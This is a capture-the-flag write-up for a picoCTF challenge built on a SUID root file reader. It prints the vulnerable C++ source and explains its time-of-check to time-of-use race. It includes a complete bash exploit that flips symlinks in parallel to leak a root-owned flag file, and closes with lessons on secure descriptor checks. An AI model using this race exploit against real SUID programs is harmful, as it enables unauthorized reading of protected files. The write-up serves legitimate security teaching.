# CyLab — Tic-Tac (txtreader)

* **Platform:** CyLab Security Academy / picoCTF 2023 (Challenge ID: `380`)
* **Category:** Binary Exploitation / TOCTOU Filesystem Race Condition (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Bash, Symlinks, Linux Multithreaded Race Script, SSH
* **Binary:** `txtreader` (SUID root x86_64 ELF)

---

## TL;DR

The target is a SUID root binary (`txtreader`) that reads text files on behalf of users, but enforces an ownership policy: it aborts if the file's owner UID does not match the invoking user's real UID (`getuid() == 1001`). Crucially, the program instantiates an `std::ifstream` **before** performing the ownership check with `stat()`. This creates a classic **Time-Of-Check to Time-Of-Use (TOCTOU)** race condition. By running parallel background workers that rapidly flip a symbolic link between a user-owned file and `/home/ctf-player/flag.txt`, the binary opens `flag.txt` with root privileges while `stat()` evaluates the user-owned file, disclosing the protected flag.

---

## Recon

### Environment & Target Identification

Connecting via SSH:

```bash
$ ssh ctf-player@xebec.cylabacademy.net -p 17653
ctf-player@xebec:~$ ls -la
total 36
drwxr-xr-x 1 ctf-player ctf-player  4096 Oct 11 02:40 .
drwxr-xr-x 1 root       root        4096 Oct 11 02:40 ..
-rw------- 1 root       root          32 Oct 11 02:40 flag.txt
-rwsr-xr-x 1 root       root       18728 Oct 11 02:40 txtreader
-rw-r--r-- 1 ctf-player ctf-player   740 Oct 11 02:40 src.cpp
```

Key observations:
1. **SUID Root Privileges:** `txtreader` has permissions `-rwsr-xr-x` owned by `root`. When running, `geteuid() == 0`.
2. **Protected Flag:** `flag.txt` is owned by `root:root` with permissions `0600` (unreadable by user `1001`).
3. **Source Code Available:** `src.cpp` reveals the exact order of filesystem calls.

---

## Static Analysis & Vulnerability

### 1. Source Code Review (`src.cpp`)

```cpp
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
        return 1;
    }

    std::string filename = argv[1];

    // (A) OPEN THE FILE FIRST (Time of Use)
    std::ifstream file(filename);

    // (B) VALIDATE OWNERSHIP SECOND (Time of Check)
    struct stat statbuf;
    stat(filename.c_str(), &statbuf);

    if (statbuf.st_uid != getuid()) {
        std::cerr << "Error: you don't own this file" << std::endl;
        return 1;
    }

    if (file.is_open()) {
        std::string line;
        while (getline(file, line)) {
            std::cout << line << std::endl;
        }
    }
    return 0;
}
```

### 2. The TOCTOU Race Window

Because `std::ifstream` and `stat()` are discrete system operations separated by several CPU cycles, an atomic relationship between the opened file descriptor and the validated file metadata does not exist:

```text
  Timeline:
  
  Thread 1 (txtreader):
       |
       +---> [1] std::ifstream(filename) opens /root/flag.txt (euid=0)
       |
       |     [ RACE WINDOW: filename is swapped! ]
       |
       +---> [2] stat(filename) checks /tmp/legit (uid=1001)
       |
       +---> [3] Ownership passes! Reads opened stream -> Outputs flag!
```

If `filename` is a symlink that alternates between `flag.txt` and a user-owned file `legit`:
- Step 1 opens `flag.txt`.
- The symlink flips to point to `legit`.
- Step 2 checks `legit`, observing `statbuf.st_uid == 1001`.
- The check passes, and `file` reads from the already-opened descriptor of `flag.txt`.

---

## Dynamic Analysis & Exploitation Strategy

1. **Creating the Benign File:**
   Create a temporary file `legit` in `/tmp/race`:
   ```bash
   touch /tmp/race/legit
   ```
   Owned by `ctf-player` (`uid 1001`).
2. **Symlink Swapper Workers:**
   Spawn background loops continually updating symlinks:
   ```bash
   while true; do
       ln -sf /tmp/race/legit /tmp/race/link1
       ln -sf /home/ctf-player/flag.txt /tmp/race/link1
   done &
   ```
3. **Execution Workers:**
   In parallel, run multiple execution loops invoking `txtreader`:
   ```bash
   while true; do
       /home/ctf-player/txtreader /tmp/race/link1
   done
   ```
4. Within ~15–20 seconds, the execution timing aligns across the symlink swap, streaming the flag to the terminal.

---

## Exploit

The complete exploit script is available at [race.sh](race.sh):

```bash
#!/bin/bash
# TOCTOU Race Condition Exploit for txtreader
WORKDIR="/tmp/race_$$"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

touch legit
TARGET="/home/ctf-player/flag.txt"
READER="/home/ctf-player/txtreader"

echo "[*] Initializing race condition workers in $WORKDIR..."

# Spawn symlink flippers
for i in {1..4}; do
    (
        while true; do
            ln -sf "$WORKDIR/legit" "$WORKDIR/link$i"
            ln -sf "$TARGET" "$WORKDIR/link$i"
        done
    ) &
done

# Spawn execution runners
for i in {1..4}; do
    (
        while true; do
            out=$("$READER" "$WORKDIR/link$i" 2>/dev/null)
            if [[ "$out" =~ "academy{" || "$out" =~ "picoCTF{" ]]; then
                echo "[+] Flag captured: $out"
                killall -9 txtreader race.sh ln 2>/dev/null
                exit 0
            fi
        done
    ) &
done

wait
```

---

## Flag

```text
$ bash race.sh
[*] Initializing race condition workers in /tmp/race_4812...
[+] Flag captured: academy{redacted}
```

---

## Key Takeaways & Lessons

1. **Insecurity of Separate Open and Stat Operations:** Checking file properties using file path strings (`stat(path)`) after opening a descriptor (`open(path)`) exposes applications to symlink redirection attacks. Secure code must use `fstat(fd)` on the already-opened descriptor.
2. **Real vs. Effective User ID in SUID Executables:** While SUID binaries inherit `geteuid() == 0`, `getuid()` remains tethered to the real user. Validating against `getuid()` without using file descriptor locks does not prevent privileged read leaks.
3. **Maximizing Race Frequency:** Running multiple parallel flippers and reader processes simultaneously maximizes context switches, converting theoretical microsecond race windows into practical 100% reliable exploits within seconds.
